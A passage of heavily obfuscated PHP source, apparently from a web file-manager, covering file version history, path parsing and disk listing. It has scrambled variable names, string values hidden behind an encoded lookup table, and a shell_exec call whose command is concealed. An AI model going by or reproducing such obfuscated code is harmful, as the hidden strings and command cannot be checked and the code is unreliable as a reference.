$ÕÉ‚ã§); } public static function remove($“ëÅùÏª, $äà„²·) { $î”Ç›’• =& $_SERVER[¶Ô„œ…¯]; $Ó“Â¨ğé = self::listData($“ëÅùÏª); $ÁêíÏä› = array(); if (!$Ó“Â¨ğé) { return !1; } foreach ($Ó“Â¨ğé[$î”Ç›’•[447]] as $öøíù‚¯) { if ($öøíù‚¯[$î”Ç›’•[477]] == $äà„²·) { IO::remove($Ó“Â¨ğé[$î”Ç›’•[1335]] . $öøíù‚¯[$î”Ç›’•[32]]); continue; } $ÁêíÏä›[] = $öøíù‚¯; } return self::saveData($Ó“Â¨ğé[$î”Ç›’•[1336]], $ÁêíÏä›); } public static function clear($ÏãúôÊê, $òŸÀéØ‹ = true) { $Õ¨ÂÍ‚Ç =& $_SERVER[¶Ô„œ…¯]; $óœ¼îóÇ = self::listData($ÏãúôÊê, $òŸÀéØ‹); if (!$óœ¼îóÇ) { return !1; } foreach ($óœ¼îóÇ[$Õ¨ÂÍ‚Ç[447]] as $ú€ùº¥) { IO::remove($óœ¼îóÇ[$Õ¨ÂÍ‚Ç[1335]] . $ú€ùº¥[$Õ¨ÂÍ‚Ç[32]]); } return self::saveData($óœ¼îóÇ[$Õ¨ÂÍ‚Ç[1336]], array()); } public static function moveHistory($Â«»â•Ó, $şã„ÖÅ = '', $ñŸ¾‡Û² = '') { $ïİÖ€³¨ =& $_SERVER[¶Ô„œ…¯]; $ÉÈ§³¨ = self::listData($Â«»â•Ó, !1); if (!$ÉÈ§³¨ || !$ÉÈ§³¨[$ïİÖ€³¨[447]]) { return !1; } $ÍŞ»¥üİ = $ïİÖ€³¨[1323]; $şã„ÖÅ = $şã„ÖÅ ? $şã„ÖÅ : get_path_this($Â«»â•Ó); $ñŸ¾‡Û² = $ñŸ¾‡Û² ? $ñŸ¾‡Û² : $ÉÈ§³¨[$ïİÖ€³¨[1335]]; $ò…˜á² = substr(get_path_this($ÉÈ§³¨[$ïİÖ€³¨[1336]]), 0, -strlen($ÍŞ»¥üİ)); foreach ($ÉÈ§³¨[$ïİÖ€³¨[447]] as $ñˆ€´ùÄ => $³¥ƒôŠ“) { $‡ıü¥ÂĞ = $şã„ÖÅ . substr($³¥ƒôŠ“[$ïİÖ€³¨[32]], strlen($ò…˜á²)); $Ò‡…¨³Œ = IO::move($ÉÈ§³¨[$ïİÖ€³¨[1335]] . $³¥ƒôŠ“[$ïİÖ€³¨[32]], $ñŸ¾‡Û², !1, $‡ıü¥ÂĞ); if ($Ò‡…¨³Œ) { $ÉÈ§³¨[$ïİÖ€³¨[447]][$ñˆ€´ùÄ][$ïİÖ€³¨[32]] = $‡ıü¥ÂĞ; } } $ÉÈ§³¨[$ïİÖ€³¨[1336]] = IO::move($ÉÈ§³¨[$ïİÖ€³¨[1336]], $ñŸ¾‡Û², !1, $şã„ÖÅ . $ÍŞ»¥üİ); self::saveData($ÉÈ§³¨[$ïİÖ€³¨[1336]], $ÉÈ§³¨[$ïİÖ€³¨[447]]); self::clearEmptyFolder($ÉÈ§³¨[$ïİÖ€³¨[1335]]); } public static function rollback($šÍòæ­, $éêÓ·äŞ) { $°ö×é‘Ò =& $_SERVER[¶Ô„œ…¯]; $®æÃ€îİ = self::listData($šÍòæ­); if (!$®æÃ€îİ) { return; } $À´‹Ü• = IO::info($šÍòæ­); foreach ($®æÃ€îİ[$°ö×é‘Ò[447]] as $¸›½© => $œ·¡§‰®) { if ($œ·¡§‰®[$°ö×é‘Ò[477]] == $éêÓ·äŞ) { self::add($šÍòæ­); $ÖºÅ‰ = $®æÃ€îİ[$°ö×é‘Ò[1335]] . $œ·¡§‰®[$°ö×é‘Ò[32]]; $Æì˜¬  = IO::copy($ÖºÅ‰, IO::pathFather($šÍòæ­), REPEAT_REPLACE, $À´‹Ü•[$°ö×é‘Ò[32]]); if ($Æì˜¬ ) { self::remove($šÍòæ­, $éêÓ·äŞ); } return $Æì˜¬ ; } } return !1; } public static function setDetail($æë½ü¿, $­îˆì‰û, $¥Šìñâ) { $ˆÓüğíë =& $_SERVER[¶Ô„œ…¯]; $Î¦ñÁ‡‘ = self::listData($æë½ü¿); if (!$Î¦ñÁ‡‘) { return; } foreach ($Î¦ñÁ‡‘[$ˆÓüğíë[447]] as $°‹êŒÙ => $ŠøŸÖ´) { if ($ŠøŸÖ´[$ˆÓüğíë[477]] == $­îˆì‰û) { $Î¦ñÁ‡‘[$ˆÓüğíë[447]][$°‹êŒÙ][$ˆÓüğíë[1334]] = $¥Šìñâ; self::saveData($Î¦ñÁ‡‘[$ˆÓüğíë[1336]], $Î¦ñÁ‡‘[$ˆÓüğíë[447]]); return !0; } } return !1; } public static function fileInfo($£š†æÀ², $Û«û¨Ó) { $œß’À¤… =& $_SERVER[¶Ô„œ…¯]; $ŒŞì§» = self::listData($£š†æÀ²); if (!$ŒŞì§») { show_json(LNG($œß’À¤…[108]), !1); } $Áıº£·´ = $œß’À¤…[12]; foreach ($ŒŞì§»[$œß’À¤…[447]] as $¼ˆ”§şç => $¾é¡ï˜) { if ($¾é¡ï˜[$œß’À¤…[477]] != $Û«û¨Ó) { continue; } $Áıº£·´ = $ŒŞì§»[$œß’À¤…[1335]] . $¾é¡ï˜[$œß’À¤…[32]]; break; } if (!$Áıº£·´) { show_json(LNG($œß’À¤…[108]), !1); } return IO::info($Áıº£·´); } public static function fileOut($òÏÀô¸ï, $ŸĞ°Æù, $ÓÚ¢Ğ¥” = false) { $ÜŠÂœ±€ =& $_SERVER[¶Ô„œ…¯]; $™–õãüÑ = self::fileInfo($òÏÀô¸ï, $ŸĞ°Æù); $¹ Œ¬™ç =& $GLOBALS[$ÜŠÂœ±€[7]]; $ÓÚ¢Ğ¥” = isset($¹ Œ¬™ç[$ÜŠÂœ±€[1286]]) && $¹ Œ¬™ç[$ÜŠÂœ±€[1286]] == 1; if (isset($¹ Œ¬™ç[$ÜŠÂœ±€[33]]) && $¹ Œ¬™ç[$ÜŠÂœ±€[33]] == $ÜŠÂœ±€[1337]) { return IO::fileOutImage($™–õãüÑ[$ÜŠÂœ±€[87]], $¹ Œ¬™ç[$ÜŠÂœ±€[1338]]); } IO::fileOut($™–õãüÑ[$ÜŠÂœ±€[87]], $ÓÚ¢Ğ¥”, get_path_this($òÏÀô¸ï)); } public static function listData($÷¼Ô©§, $ÛÙœ½ºÏ = true) { $Ô‚œ÷” =& $_SERVER[¶Ô„œ…¯]; if ($ÛÙœ½ºÏ && !IO::exist($÷¼Ô©§)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($÷¼Ô©§, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Æè±ÍÈ = self::pathHistory($÷¼Ô©§); $¼ñ²äö© = array($Ô‚œ÷”[1336] => $Æè±ÍÈ . $Ô‚œ÷”[1323], $Ô‚œ÷”[1335] => rtrim(get_path_father($Æè±ÍÈ), $Ô‚œ÷”[8]) . $Ô‚œ÷”[8], $Ô‚œ÷”[447] => array()); $Øºóîù = IO::getContent($¼ñ²äö©[$Ô‚œ÷”[1336]]); if ($Øºóîù) { $£İÜß§¯ = json_decode($Øºóîù, !0); if (is_array($£İÜß§¯)) { $¼ñ²äö©[$Ô‚œ÷”[447]] = $£İÜß§¯; } } return $¼ñ²äö©; } private static function saveData($ÎúÚà©Ê, $É×ëÕß¨) { $ø’¦­ŸĞ =& $_SERVER[¶Ô„œ…¯]; self::log($ø’¦­ŸĞ[1339] . $ÎúÚà©Ê . $ø’¦­ŸĞ[74] . count($É×ëÕß¨), $ø’¦­ŸĞ[830]); if ($É×ëÕß¨) { return IO::setContent($ÎúÚà©Ê, json_encode($É×ëÕß¨)); } $Æä®‡Äç = IO::pathFather($ÎúÚà©Ê); IO::remove($ÎúÚà©Ê); self::clearEmptyFolder($Æä®‡Äç); return !0; } public static function clearEmptyFolder($´ö²£Ö‚) { $³”‰ğì =& $_SERVER[¶Ô„œ…¯]; if (trim($´ö²£Ö‚, $³”‰ğì[8]) == trim(self::$_historyBase, $³”‰ğì[8])) { return; } $å«ÎêÏ = IO::pathFather($´ö²£Ö‚); $ï Ê¥òÜ = IO::has($´ö²£Ö‚, !0); if ($ï Ê¥òÜ[$³”‰ğì[241]] > 0 || $ï Ê¥òÜ[$³”‰ğì[242]] > 0) { return; } IO::remove($´ö²£Ö‚); self::clearEmptyFolder($å«ÎêÏ); } private static function getBasePath() { $°éØÍ¯¢ =& $_SERVER[¶Ô„œ…¯]; $•àœ»ö = Model($°éØÍ¯¢[1340])->get($°éØÍ¯¢[1341]); if ($•àœ»ö) { if (!IO::exist($•àœ»ö)) { IO::mkdir($•àœ»ö); } if (get_path_this($•àœ»ö) == $°éØÍ¯¢[1326]) { $¿·ø¥™ = $°éØÍ¯¢[1342] . rand_string(8); @rename($•àœ»ö, get_path_father($•àœ»ö) . $°éØÍ¯¢[8] . $¿·ø¥™); $•àœ»ö = DATA_PATH . $¿·ø¥™ . $°éØÍ¯¢[8]; file_put_contents(DATA_PATH . $°éØÍ¯¢[1273], $°éØÍ¯¢[12]); Model($°éØÍ¯¢[1340])->set($°éØÍ¯¢[1341], $•àœ»ö); } return $•àœ»ö; } $•àœ»ö = DATA_PATH . $°éØÍ¯¢[1342] . rand_string(8) . $°éØÍ¯¢[8]; $•àœ»ö = IO::mkdir($•àœ»ö); $•àœ»ö = rtrim($•àœ»ö, $°éØÍ¯¢[8]) . $°éØÍ¯¢[8]; file_put_contents($•àœ»ö . $°éØÍ¯¢[1273], $°éØÍ¯¢[12]); file_put_contents(DATA_PATH . $°éØÍ¯¢[1273], $°éØÍ¯¢[12]); Model($°éØÍ¯¢[1340])->set($°éØÍ¯¢[1341], $•àœ»ö); return $•àœ»ö; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\143\x79\x63\154\145\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\106\151\154\x65\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\154\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\x70\122\157\157\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\123\150\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\150\x61\x72\145\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\x65\124\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\145\x49\164\x65\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\153\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\122\145\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\x72\x7d"; public static function typeList() { $†ÒÄğÎ =& $_SERVER[¶Ô„œ…¯]; return array($†ÒÄğÎ[1343] => self::KOD_SOURCE, $†ÒÄğÎ[1344] => self::KOD_USER_RECYCLE, $†ÒÄğÎ[1345] => self::KOD_USER_FAV, $†ÒÄğÎ[1346] => self::KOD_USER_FILE_TAG, $†ÒÄğÎ[1347] => self::KOD_USER_FILE_TYPE, $†ÒÄğÎ[1348] => self::KOD_GROUP_ROOT_SELF, $†ÒÄğÎ[1349] => self::KOD_USER_SHARE, $†ÒÄğÎ[1350] => self::KOD_USER_SHARE_LINK, $†ÒÄğÎ[1351] => self::KOD_USER_SHARE_TO_ME, $†ÒÄğÎ[1352] => self::KOD_SHARE_ITEM, $†ÒÄğÎ[1353] => self::KOD_SHARE_LINK, $†ÒÄğÎ[1354] => self::KOD_SEARCH, $†ÒÄğÎ[1355] => self::KOD_BLOCK, $†ÒÄğÎ[1356] => self::KOD_IO, $†ÒÄğÎ[1357] => self::KOD_USER_RECENT, $†ÒÄğÎ[1358] => self::KOD_USER_DRIVER); } public static function parse($š”Øá›Ö) { $ÅËœ®‡ş =& $_SERVER[¶Ô„œ…¯]; $š”Øá›Ö = self::clear($š”Øá›Ö); $à«€Ó×ş = array_values(self::typeList()); preg_match($ÅËœ®‡ş[1359], $š”Øá›Ö, $ûş‚•Œ©); $™ĞÇğ…‚ = array($ÅËœ®‡ş[498] => !1, $ÅËœ®‡ş[1360] => !1, $ÅËœ®‡ş[495] => !1, $ÅËœ®‡ş[87] => $š”Øá›Ö, $ÅËœ®‡ş[1258] => !1, $ÅËœ®‡ş[1257] => $ÅËœ®‡ş[12]); if (is_array($ûş‚•Œ©) && count($ûş‚•Œ©) == 5) { $ıíèãÑÜ = $ÅËœ®‡ş[1361] . $ûş‚•Œ©[2] . $ÅËœ®‡ş[404]; if (in_array($ıíèãÑÜ, $à«€Ó×ş)) { $™ĞÇğ…‚[$ÅËœ®‡ş[1258]] = $ûş‚•Œ©[1]; $™ĞÇğ…‚[$ÅËœ®‡ş[33]] = $ıíèãÑÜ; $™ĞÇğ…‚[$ÅËœ®‡ş[1362]] = substr($ıíèãÑÜ, 1, -1); $™ĞÇğ…‚[$ÅËœ®‡ş[477]] = $ûş‚•Œ©[3]; } $™ĞÇğ…‚[$ÅËœ®‡ş[1257]] = $ûş‚•Œ©[4]; } $Œ—øßÁ = array($ÅËœ®‡ş[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $™ĞÇğ…‚[$ÅËœ®‡ş[1325]] = in_array($™ĞÇğ…‚[$ÅËœ®‡ş[33]], $Œ—øßÁ); return $™ĞÇğ…‚; } public static function isTruePath($¾•šÑ‘²) { $‚›Òò´¶ =& $_SERVER[¶Ô„œ…¯]; if (substr($¾•šÑ‘², 0, 1) != $‚›Òò´¶[1361]) { return !0; } if (strpos($¾•šÑ‘², $‚›Òò´¶[485]) === 0) { return !0; } if (strpos($¾•šÑ‘², $‚›Òò´¶[1329]) === 0) { return !0; } if (strpos($¾•šÑ‘², $‚›Òò´¶[1363]) === 0) { return !0; } if (strpos($¾•šÑ‘², $‚›Òò´¶[1364]) === 0) { return !0; } if (strpos($¾•šÑ‘², $‚›Òò´¶[1365]) === 0) { return !0; } return !1; } public static function clear($ĞîŠ™Ç¾) { $‹šìÜòÜ =& $_SERVER[¶Ô„œ…¯]; $ĞîŠ™Ç¾ = str_replace(array($‹šìÜòÜ[1163], $‹šìÜòÜ[287]), $‹šìÜòÜ[53], $ĞîŠ™Ç¾); $ĞîŠ™Ç¾ = str_replace($‹šìÜòÜ[100], $‹šìÜòÜ[8], $ĞîŠ™Ç¾); $êáâÌ—§ = $‹šìÜòÜ[1366]; if (substr($ĞîŠ™Ç¾, 0, 3) == $‹šìÜòÜ[1367]) { $ĞîŠ™Ç¾ = substr($ĞîŠ™Ç¾, 3); } while (strstr($ĞîŠ™Ç¾, $êáâÌ—§)) { $ĞîŠ™Ç¾ = str_replace($êáâÌ—§, $‹šìÜòÜ[8], $ĞîŠ™Ç¾); } $ĞîŠ™Ç¾ = preg_replace($‹šìÜòÜ[1368], $‹šìÜòÜ[8], $ĞîŠ™Ç¾); if ($ĞîŠ™Ç¾ == $‹šìÜòÜ[8]) { return $‹šìÜòÜ[8]; } $ĞîŠ™Ç¾ = rtrim($ĞîŠ™Ç¾, $‹šìÜòÜ[8]); return $ĞîŠ™Ç¾; } public static function pathTrue($ûçÁ½‘„) { $¿şôÜÚˆ =& $_SERVER[¶Ô„œ…¯]; if (!$ûçÁ½‘„) { return $¿şôÜÚˆ[12]; } $ûçÁ½‘„ = str_replace($¿şôÜÚˆ[256], $¿şôÜÚˆ[8], str_replace($¿şôÜÚˆ[1369], $¿şôÜÚˆ[8], $ûçÁ½‘„)); $ûçÁ½‘„ = str_replace($¿şôÜÚˆ[256], $¿şôÜÚˆ[8], str_replace($¿şôÜÚˆ[1369], $¿şôÜÚˆ[8], $ûçÁ½‘„)); if (!strstr($ûçÁ½‘„, $¿şôÜÚˆ[1367])) { return $ûçÁ½‘„; } $€ˆÊÒİ = explode($¿şôÜÚˆ[8], $ûçÁ½‘„); foreach ($€ˆÊÒİ as $âÏŒÎŸó => $×”ê×Ô) { if ($×”ê×Ô !== $¿şôÜÚˆ[1370]) { continue; } for ($Ö±’Ë÷µ = $âÏŒÎŸó; $Ö±’Ë÷µ >= 0; $Ö±’Ë÷µ--) { if ($€ˆÊÒİ[$Ö±’Ë÷µ] === $¿şôÜÚˆ[10] || $€ˆÊÒİ[$Ö±’Ë÷µ] === $¿şôÜÚˆ[1370] || $€ˆÊÒİ[$Ö±’Ë÷µ] === -1) { continue; } if ($€ˆÊÒİ[$Ö±’Ë÷µ] === $¿şôÜÚˆ[12]) { $€ˆÊÒİ[$âÏŒÎŸó] = -1; break; } $€ˆÊÒİ[$âÏŒÎŸó] = -1; $€ˆÊÒİ[$Ö±’Ë÷µ] = -1; break; } } $Ğ¹½š®Æ = array(); foreach ($€ˆÊÒİ as $×”ê×Ô) { if ($×”ê×Ô !== -1) { $Ğ¹½š®Æ[] = $×”ê×Ô; } } $Øóãâ†Ë = implode($¿şôÜÚˆ[8], $Ğ¹½š®Æ); if (strpos($Øóãâ†Ë, $¿şôÜÚˆ[1371]) === 0) { $Øóãâ†Ë = $¿şôÜÚˆ[1367] . substr($Øóãâ†Ë, strlen($¿şôÜÚˆ[1371])); } return $Øóãâ†Ë; } public static function pathUrlClear($ªı½é©…) { $ûÚ¯“¾™ =& $_SERVER[¶Ô„œ…¯]; if (!$ªı½é©…) { return $ªı½é©…; } $ªı½é©… = rawurldecode($ªı½é©…); $ªı½é©… = str_replace($ûÚ¯“¾™[1369], $ûÚ¯“¾™[8], $ªı½é©…); if (strpos($ªı½é©…, $ûÚ¯“¾™[76]) > 0) { $ªı½é©… = substr($ªı½é©…, 0, strpos($ªı½é©…, $ûÚ¯“¾™[76])); } if (strpos($ªı½é©…, $ûÚ¯“¾™[1372]) > 0) { $ªı½é©… = substr($ªı½é©…, 0, strpos($ªı½é©…, $ûÚ¯“¾™[1372])); } return $ªı½é©…; } public static function sourceID($ˆïÚÇËŒ) { $ô†ÄÁ®„ =& $_SERVER[¶Ô„œ…¯]; $³ô•¿Å¨ = self::parse($ˆïÚÇËŒ); if ($³ô•¿Å¨[$ô†ÄÁ®„[33]] !== self::KOD_SOURCE) { show_json(LNG($ô†ÄÁ®„[1373]), !1); } return $³ô•¿Å¨[$ô†ÄÁ®„[477]]; } public static function make($Ÿ¿àÚ) { if (!$Ÿ¿àÚ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ÿ¿àÚ)); } public static function makeShare($Ñ÷İæ, $êÕˆ¤µ) { return self::makePath(self::KOD_SHARE_ITEM, $Ñ÷İæ, $êÕˆ¤µ); } public static function makeFileTypePath($……›ÄœÉ) { return self::makePath(self::KOD_USER_FILE_TYPE, $……›ÄœÉ); } public static function makeFileTagPath($ŞšÃÀ¾“) { return self::makePath(self::KOD_USER_FILE_TAG, $ŞšÃÀ¾“); } public static function makePath($Şâ¨ş™µ, $¿ëçê‘Ø = '', $Ãã÷øË± = '') { $¤º˜¡¾¼ =& $_SERVER[¶Ô„œ…¯]; $¾¡ÅİÈ = substr($Şâ¨ş™µ, 1, -1); $¼°˜÷´î = $¤º˜¡¾¼[1374] . $¾¡ÅİÈ . $¤º˜¡¾¼[1375] . $¿ëçê‘Ø . $¤º˜¡¾¼[1376]; $¼°˜÷´î = $Ãã÷øË± ? $¼°˜÷´î . $Ãã÷øË± . $¤º˜¡¾¼[8] : $¼°˜÷´î; return $¼°˜÷´î; } public static function hashPath($¾ì…»¯, $…»Â’ÉÌ = true) { $ïö¥òö =& $_SERVER[¶Ô„œ…¯]; $âåúÏÊ = is_array($¾ì…»¯) ? $¾ì…»¯ : IO::info($¾ì…»¯); $ÁÂñ¬é‹ = _get($âåúÏÊ, $ïö¥òö[1377], $ïö¥òö[12]); if (!$ÁÂñ¬é‹ && isset($âåúÏÊ[$ïö¥òö[237]])) { $ÁÂñ¬é‹ = trim($âåúÏÊ[$ïö¥òö[237]], $ïö¥òö[121]); } if (!$ÁÂñ¬é‹ && isset($âåúÏÊ[$ïö¥òö[193]]) && $âåúÏÊ[$ïö¥òö[193]]) { $âåúÏÊ = IO::info(KodIO::make($âåúÏÊ[$ïö¥òö[193]])); $ÁÂñ¬é‹ = _get($âåúÏÊ, $ïö¥òö[1377], $ïö¥òö[12]); } $À®ÀÇ = md5($âåúÏÊ[$ïö¥òö[87]] . $âåúÏÊ[$ïö¥òö[79]] . $âåúÏÊ[$ïö¥òö[88]]); if (!$ÁÂñ¬é‹ && file_exists($âåúÏÊ[$ïö¥òö[87]])) { $ÁÂñ¬é‹ = Cache::get($À®ÀÇ . $ïö¥òö[1378]); $ÁÂñ¬é‹ = !1; if (!$ÁÂñ¬é‹) { $ÁÂñ¬é‹ = IO::hashSimple($âåúÏÊ[$ïö¥òö[87]]); Cache::set($À®ÀÇ . $ïö¥òö[1378], $ÁÂñ¬é‹, 3600 * 24 * 30); } } if ($…»Â’ÉÌ && !$ÁÂñ¬é‹) { } return $ÁÂñ¬é‹ ? $ÁÂñ¬é‹ : $À®ÀÇ; } public static function hashPathSafe($˜½ù»÷½, $®İ‡¤¹¢ = true) { $“õ ×µë =& $_SERVER[¶Ô„œ…¯]; $Âæ§¯Â = self::hashPath($˜½ù»÷½, $®İ‡¤¹¢); return md5($Âæ§¯Â . $“õ ×µë[1379] . Model($“õ ×µë[848])->get($“õ ×µë[849])); } public static function initSystemPath() { $›„¿â¯ =& $_SERVER[¶Ô„œ…¯]; if (defined($›„¿â¯[1380])) { return; } define($›„¿â¯[1380], self::systemPath($›„¿â¯[191])); define($›„¿â¯[1381], self::systemPath($›„¿â¯[1382])); define($›„¿â¯[1383], self::systemPath($›„¿â¯[1384])); define($›„¿â¯[1385], self::systemPath($›„¿â¯[1386])); IOHistory::bindEvent(); } public static function systemPath($¯©–‰šì) { $ı¦©Ã” =& $_SERVER[¶Ô„œ…¯]; $àâó§ŞÙ = $ı¦©Ã”[1387] . ucfirst($¯©–‰šì); $‹§¨‡‹² = Model($ı¦©Ã”[848])->get($àâó§ŞÙ); if ($‹§¨‡‹²) { return $‹§¨‡‹²; } if ($¯©–‰šì == $ı¦©Ã”[191]) { $‹§¨‡‹² = self::make(Model($ı¦©Ã”[903])->systemRootPathAdd($ı¦©Ã”[610])); } else { $‹§¨‡‹² = self::systemPath($ı¦©Ã”[191]); $ó®µ¸Î· = self::sourceID($‹§¨‡‹²); $‹§¨‡‹² = self::make(Model($ı¦©Ã”[903])->mkdir($ó®µ¸Î·, $¯©–‰šì)); } Model($ı¦©Ã”[848])->set($àâó§ŞÙ, $‹§¨‡‹²); return $‹§¨‡‹²; } public static function systemFolder($ëäù÷) { $Æè«‰ = IO_PATH_SYSTEM_SOURCE . $ëäù÷; $ü«îÍç = Cache::get($Æè«‰); if (!$ü«îÍç) { $€ù¹‘‡Ù = IO::infoFullSimple($Æè«‰); if (!$€ù¹‘‡Ù) { $ü«îÍç = IO::mkdir($Æè«‰, REPEAT_SKIP); } else { $ü«îÍç = $€ù¹‘‡Ù[$_SERVER[¶Ô„œ…¯][87]]; } Cache::set($Æè«‰, $ü«îÍç, 3600 * 10); } return $ü«îÍç; } public static function defaultDriver() { return Model($_SERVER[¶Ô„œ…¯][845])->defaultDriver(); } public static function defaultIO() { $ÜíÁË¦Ê =& $_SERVER[¶Ô„œ…¯]; $³×Ó»İÆ = self::defaultDriver(); return $ÜíÁË¦Ê[1388] . $³×Ó»İÆ[$ÜíÁË¦Ê[477]] . $ÜíÁË¦Ê[1376]; } public static function defaultDriverInit() { static $‡œ…•±È = false; if ($‡œ…•±È) { return $‡œ…•±È; } $‡œ…•±È = IO::init(self::defaultIO()); return $‡œ…•±È; } public static function fileTypeList() { $Ï÷æ¼ã­ =& $_SERVER[¶Ô„œ…¯]; $…íìËÈà = $GLOBALS[$Ï÷æ¼ã­[6]][$Ï÷æ¼ã­[1389]]; foreach ($…íìËÈà as $à Ô×µ° => $î™¹êéÓ) { $˜­¥‚ø„ = $Ï÷æ¼ã­[1390] . $à Ô×µ°; $Ñ‰à¢äô = LNG($˜­¥‚ø„); if ($˜­¥‚ø„ != $Ñ‰à¢äô) { $…íìËÈà[$à Ô×µ°][$Ï÷æ¼ã­[32]] = $Ñ‰à¢äô; } } return $…íìËÈà; } public static function diskList($  ‡Å‘· = true) { $Ãøúº¥ = $_SERVER[¶Ô„œ…¯][1391]; if ($  ‡Å‘·) { $ÓÖÍÑŠŸ = Cache::get($Ãøúº¥); if (is_array($ÓÖÍÑŠŸ)) { return $ÓÖÍÑŠŸ; } } $ÓÖÍÑŠŸ = self::diskListGet(); Cache::set($Ãøúº¥, $ÓÖÍÑŠŸ, 60); return $ÓÖÍÑŠŸ; } public static function diskListGet() { $Á¦Áä­› =& $_SERVER[¶Ô„œ…¯]; $óÛè–˜  = array(); if ($GLOBALS[$Á¦Áä­›[6]][$Á¦Áä­›[1392]] == $Á¦Áä­›[1393]) { $©ø›Õßİ = $Á¦Áä­›[1394]; for ($ïí£—ß„ = 0; $ïí£—ß„ < strlen($©ø›Õßİ); $ïí£—ß„++) { $ÍÛ ¿åì = $©ø›Õßİ[$ïí£—ß„] . $Á¦Áä­›[1395]; if (file_exists($ÍÛ ¿åì)) { $óÛè–˜ [] = $ÍÛ ¿åì; } } return $óÛè–˜ ; } if (!function_exists($Á¦Áä­›[101])) { $óÛè–˜ [] = $Á¦Áä­›[914]; return $óÛè–˜ ; } $ÌÊ¤•Æ± = explode($Á¦Áä­›[287], shell_exec($Á¦Áä­›[1396])); array_shift($ÌÊ¤•Æ±); array_pop($ÌÊ¤•Æ±); $ÒŞºÌ® = array($Á¦Áä­›[1397], $Á¦Áä­›[1398], $Á¦Áä­›[1399], $Á¦Áä­›[1400], $Á¦Áä­›[1401], $Á¦Áä­›[1402], $Á¦Áä­›[1403], $Á¦Áä­›[1404]); foreach ($ÌÊ¤•Æ± as $éÎ–ÒŒø) { $òçßÓœú = preg_split($Á¦Áä­›[1405], $éÎ–ÒŒø); $ÍÛ ¿åì = $òçßÓœú[count($òçßÓœú) - 1]; if (!strstr($òçßÓœú[0], $Á¦Áä­›[1406]) || !$ÍÛ ¿åì) { continue; } $üˆğ¢ğ¿ = rtrim($ÍÛ ¿åì, $Á¦Áä­›[8]) . $Á¦Áä­›[8]; if (in_array($üˆğ¢ğ¿, $ÒŞºÌ®)) { continue; } $óÛè–˜ [] = $üˆğ¢ğ¿; } return $óÛè–˜ ; } public static function isSameDisk($ÜÛ¹õí”, $š¤é¨Ìˆ) { $Éº¾ºëÊ =& $_SERVER[¶Ô„œ…¯]; if ($GLOBALS[$Éº¾ºëÊ[6]][$Éº¾ºëÊ[1392]] == $Éº¾ºëÊ[1393]) { return strtolower(substr($ÜÛ¹õí”, 0, 1)) == strtolower(substr($š¤é¨Ìˆ, 0, 1)); } $‘ñäêëÛ = stat($ÜÛ¹õí”); $ÑÑ„˜¥‰ = stat($š¤é¨Ìˆ); if ($‘ñäêëÛ === !1 || $ÑÑ„˜¥‰ === !1) { return !1; } return $‘ñäêëÛ[$Éº¾ºëÊ[1407]] === $ÑÑ„˜¥‰[$Éº¾ºëÊ[1407]]; $ß½²Ÿ‘± = self::diskList(); $·‡ãÊÏ = !1; $™“±û”ä = !1; sort($ß½²Ÿ‘±); $ß½²Ÿ‘± = array_reverse($ß½²Ÿ‘±); $ÜÛ¹õí” = rtrim($ÜÛ¹õí”, $Éº¾ºëÊ[8]) . $Éº¾ºëÊ[8]; $š¤é¨Ìˆ = rtrim($š¤é¨Ìˆ, $Éº¾ºëÊ[8]) . $Éº¾ºëÊ[8]; foreach ($ß½²Ÿ‘± as $¾ĞÙ¥¸) { $ıèâıŸ = strlen($¾ĞÙ¥¸); if (!$·‡ãÊÏ && substr($ÜÛ¹õí”, 0, $ıèâıŸ) == $¾ĞÙ¥¸) { $·‡ãÊÏ = $¾ĞÙ¥¸; } if (!$™“±û”ä && substr($š¤é¨Ìˆ, 0, $ıèâıŸ) == $¾ĞÙ¥¸) { $™“±û”ä = $¾ĞÙ¥¸; } if ($·‡ãÊÏ && $™“±û”ä) { break; } } return $·‡ãÊÏ === $™“±û”ä; } public static function transferType($°°ü’†, $©¬á¦’ã) { $Âš‰ÜÜ =& $_SERVER[¶Ô„œ…¯]; $Ä°İ½ß = self::driverType($°°ü’†); $Ò´²¸ıû = self::driverType($©¬á¦’ã); if ($Ä°İ½ß[$Âš‰ÜÜ[33]] == $Ò´²¸ıû[$Âš‰ÜÜ[33]] && $Ä°İ½ß[$Âš‰ÜÜ[1408]] == $Ò´²¸ıû[$Âš‰ÜÜ[1408]]) { return $Âš‰ÜÜ[1409]; } if ($Ä°İ½ß[$Âš‰ÜÜ[33]] == $Âš‰ÜÜ[956] && $Ò´²¸ıû[$Âš‰ÜÜ[33]] == $Âš‰ÜÜ[109]) { return $Âš‰ÜÜ[1286]; } if ($Ä°İ½ß[$Âš‰ÜÜ[33]] == $Âš‰ÜÜ[109] && $Ò´²¸ıû[$Âš‰ÜÜ[33]] == $Âš‰ÜÜ[956]) { return $Âš‰ÜÜ[110]; } return $Âš‰ÜÜ[1410]; } public static function driverType($”Õ ¼ãŞ) { $—í„Ó…ƒ =& $_SERVER[¶Ô„œ…¯]; $Ş‚í¶À‰ = str_replace($—í„Ó…ƒ[1411], 